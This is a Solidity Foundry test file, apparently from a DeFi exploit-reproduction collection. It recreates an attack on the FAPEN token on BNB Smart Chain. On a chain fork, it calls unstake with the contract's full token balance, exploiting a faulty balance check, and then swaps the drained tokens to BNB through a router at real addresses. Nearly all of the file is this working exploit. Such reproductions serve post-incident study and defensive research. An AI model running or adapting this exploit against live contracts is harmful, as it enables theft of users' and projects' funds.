// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~600 USD$
// Vulnerable contract address: https://bscscan.com/address/0xf3f1abae8bfeca054b330c379794a7bf84988228

// @Info
// Vulnerable contract code: https://bscscan.com/address/0xf3f1abae8bfeca054b330c379794a7bf84988228#code
// Vulnerability: Wrong balance check in unstake function

// @Analysis - https://twitter.com/hexagate_/status/1663501550600302601

interface IFAPEN is IERC20 {
    function unstake(uint256 amount) external;
}

contract ContractTest is Test {
    IFAPEN FAPEN = IFAPEN(0xf3F1aBae8BfeCA054B330C379794A7bf84988228);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 28_637_846);
        cheats.label(address(FAPEN), "FAPEN");
        cheats.label(address(WBNB), "WBNB");
        cheats.label(address(Router), "Router");
    }

    function testUnstake() public {
        deal(address(this), 0);
        emit log_named_decimal_uint("Amount of BNB before attack", address(this).balance, 18);
        // Vulnerability lies in unstake function. Bad logic in balance check
        FAPEN.unstake(FAPEN.balanceOf(address(FAPEN)));
        FAPEN.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(FAPEN);
        path[1] = address(WBNB);
        Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            FAPEN.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
        emit log_named_decimal_uint("Amount of BNB after attack", address(this).balance, 18);
    }

    receive() external payable {}
}
